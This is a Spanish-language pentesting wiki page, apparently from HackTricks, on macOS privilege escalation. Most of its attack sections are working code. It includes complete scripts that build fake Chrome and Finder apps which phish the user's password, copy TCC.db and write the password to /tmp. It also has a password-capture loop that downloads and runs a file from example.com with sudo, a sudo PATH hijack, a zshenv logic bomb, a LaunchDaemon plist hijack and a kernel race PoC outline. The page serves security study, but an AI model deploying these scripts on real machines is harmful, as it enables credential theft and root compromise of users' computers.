# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Si llegaste aquí buscando TCC privilege escalation ve a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Ten en cuenta que **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** máquinas. Consulta:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interacción del usuario

### Sudo Hijacking

Puedes encontrar el original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Sin embargo, macOS **mantiene** el **`PATH`** del usuario cuando éste ejecuta **`sudo`**. Lo que significa que otra forma de lograr este ataque sería **hijack other binaries** que la víctima aún ejecute al **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Ten en cuenta que un usuario que usa la terminal probablemente tendrá **Homebrew instalado**. Por eso es posible secuestrar binarios en **`/opt/homebrew/bin`**.

### Dock Impersonation

Usando algo de **social engineering** podrías **suplantar por ejemplo a Google Chrome** dentro del Dock y en realidad ejecutar tu propio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algunas sugerencias:

- Comprueba en el Dock si hay un Chrome, y en ese caso **elimina** esa entrada y **añade** la **entrada falsa de Chrome en la misma posición** en el array del Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algunas sugerencias:

- No puedes eliminar Finder del Dock, así que si vas a añadirlo al Dock, podrías poner el Finder falso justo al lado del real. Para esto necesitas **añadir la entrada del Finder falso al principio del array Dock**.
- Otra opción es no colocarlo en el Dock y simplemente abrirlo; "Finder asking to control Finder" no es tan extraño.
- Otra opción para **escalate to root without asking** la contraseña con un cuadro horrible, es hacer que Finder realmente pida la contraseña para realizar una acción privilegiada:
- Pide a Finder que copie en **`/etc/pam.d`** un nuevo archivo **`sudo`** (el cuadro solicitando la contraseña indicará "Finder wants to copy sudo")
- Pide a Finder que copie un nuevo **Authorization Plugin** (Puedes controlar el nombre del archivo para que el cuadro solicitando la contraseña indique "Finder wants to copy Finder.bundle")

<details>
<summary>Script de impersonación del Dock de Finder</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

El malware frecuentemente abusa de la interacción del usuario para **capturar una contraseña válida para sudo** y reutilizarla programáticamente. Un flujo común:

1. Identificar al usuario conectado con `whoami`.
2. **Loop password prompts** hasta que `dscl . -authonly "$user" "$pw"` devuelve éxito.
3. Cachear la credencial (p. ej., `/tmp/.pass`) y ejecutar acciones privilegiadas con `sudo -S` (contraseña por stdin).

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
La contraseña robada puede reutilizarse para **borrar la cuarentena de Gatekeeper con `xattr -c`**, copiar LaunchDaemons u otros archivos privilegiados, y ejecutar etapas adicionales de forma no interactiva.

## Vectores específicos de macOS más recientes (2023–2025)

### `AuthorizationExecuteWithPrivileges` obsoleto pero aún usable

`AuthorizationExecuteWithPrivileges` fue deprecado en 10.7 pero **todavía funciona en Sonoma/Sequoia**. Muchos actualizadores comerciales invocan `/usr/libexec/security_authtrampoline` con una ruta no confiable. Si el binario objetivo es escribible por el usuario puedes plantar un trojan y aprovechar el prompt legítimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combínalo con los **masquerading tricks above** para presentar un diálogo de contraseña creíble.


### Triage de helper privilegiado / XPC

Muchas privescs modernas de terceros en macOS siguen el mismo patrón: un **root LaunchDaemon** expone un **Mach/XPC service** desde **`/Library/PrivilegedHelperTools`**, luego el helper o bien **no valida al cliente**, lo valida **demasiado tarde** (PID race), o expone un **root method** que consume una **ruta/script controlado por el usuario**. Esta es la clase de bug detrás de muchos fallos recientes en helpers de clientes VPN, lanzadores de juegos y actualizadores.

Quick triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Presta especial atención a los helpers que:

- siguen aceptando solicitudes **después de la desinstalación** porque el job permaneció cargado en `launchd`
- ejecutan scripts o leen configuración desde **`/Applications/...`** u otras rutas escribibles por usuarios no-root
- dependen de una validación entre pares **PID-based** o **bundle-id-only** que puede ser susceptible a condiciones de carrera

Para más detalles sobre fallos de autorización de helpers consulta [this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Herencia del entorno de scripts de PackageKit (CVE-2024-27822)

Hasta que Apple lo arregló en **Sonoma 14.5**, **Ventura 13.6.7** y **Monterey 12.7.5**, las instalaciones iniciadas por el usuario vía **`Installer.app`** / **`PackageKit.framework`** podían ejecutar **PKG scripts como root dentro del entorno del usuario actual**. Eso significa que un paquete que use **`#!/bin/zsh`** cargaría el **`~/.zshenv`** del atacante y lo ejecutaría como **root** cuando la víctima instalara el paquete.

Esto es especialmente interesante como una **bomba lógica**: solo necesitas un punto de apoyo en la cuenta del usuario y un archivo de inicio de shell escribible, luego esperas a que cualquier instalador vulnerable **zsh-based** sea ejecutado por el usuario. Esto **no** suele aplicarse a despliegues **MDM/Munki** porque esos se ejecutan dentro del entorno del usuario root.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Si quieres profundizar en el abuso específico de instaladores, también consulta [this page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Si un LaunchDaemon plist o su objetivo `ProgramArguments` es **user-writable**, puedes escalar intercambiándolo y luego forzando a launchd a recargar:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Esto refleja el patrón de exploit publicado para **CVE-2025-24085**, donde un plist escribible fue abusado para ejecutar código del atacante como root.

### XNU SMR credential race (CVE-2025-24118)

Una **race in `kauth_cred_proc_update`** permite a un atacante local corromper el puntero de credenciales de solo lectura (`proc_ro.p_ucred`) al competir bucles `setgid()`/`getgid()` entre hilos hasta que ocurre un torn `memcpy`. La corrupción exitosa concede **uid 0** y acceso a la memoria del kernel. Estructura mínima de PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Combínelo con heap grooming para colocar datos controlados donde el pointer se vuelva a leer. En builds vulnerables esto es un **local kernel privesc** fiable sin requisitos de SIP bypass.

### Bypass de SIP vía Migration assistant ("Migraine", CVE-2023-32369)

Si ya tienes root, SIP aún bloquea escrituras en ubicaciones del sistema. El bug **Migraine** abusa del entitlement de Migration Assistant `com.apple.rootless.install.heritable` para crear un proceso hijo que hereda el SIP bypass y sobrescribe rutas protegidas (p. ej., `/System/Library/LaunchDaemons`). La cadena:

1. Obtener root en un sistema en vivo.
2. Trigger `systemmigrationd` con un estado crafted para ejecutar un attacker-controlled binary.
3. Usar el entitlement heredado para parchear archivos protegidos por SIP, persistiendo incluso tras reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Múltiples daemons de Apple aceptan objetos **NSPredicate** vía XPC y solo validan el campo `expressionType`, que está bajo control del atacante. Al craftear un predicate que evalúe selectors arbitrarios puedes lograr **code execution en servicios XPC root/system** (p. ej., `coreduetd`, `contextstored`). Combinado con un initial app sandbox escape, esto otorga **privilege escalation sin prompts del usuario**. Busca endpoints XPC que deserialicen predicates y carezcan de un visitor robusto.

## TCC - Escalada de privilegios a root

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (incluso sin privilegios) puede crear y montar un Time Machine snapshot y **acceder a TODOS los archivos** de ese snapshot.\
El **único privilegio** necesario es que la aplicación usada (como `Terminal`) tenga **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que debe ser concedido por un admin.

<details>
<summary>Montar snapshot de Time Machine</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Una explicación más detallada se puede [**encontrar en el informe original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Información sensible

Esto puede ser útil para escalar privilegios:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referencias

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
